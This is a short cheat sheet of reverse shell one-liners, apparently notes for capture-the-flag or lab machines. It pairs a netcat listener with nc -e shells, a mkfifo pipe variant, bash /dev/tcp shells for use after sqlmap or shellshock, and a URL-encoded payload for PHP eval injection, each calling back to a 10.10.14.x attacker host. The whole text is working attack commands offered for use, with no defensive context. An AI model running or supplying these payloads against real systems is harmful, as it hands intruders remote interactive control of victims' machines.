# Reverse Shell

## Netcat

### Netcat Listener

```bash
nc -lvnp 4444
```

### NC reverse shell

```bash
nc -e /bin/sh 10.10.14.16 4444
nc -e /bin/bash 10.10.14.16 5555
```

### from OpenBSD Netcat

```bash
mkfifo f; nc 10.10.14.16 4444 0<f | /bin/sh -i 2>&1 | tee f

mkfifo f; nc 10.10.14.16 5555 0<f | /bin/bash -i 2>&1 | tee f
```

## Target box

### With bash (seen with sqlmap)

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'
```

### with shellshock

```bash
/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
```

### through php eval

```bash
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.2/9001+0>%261'
```
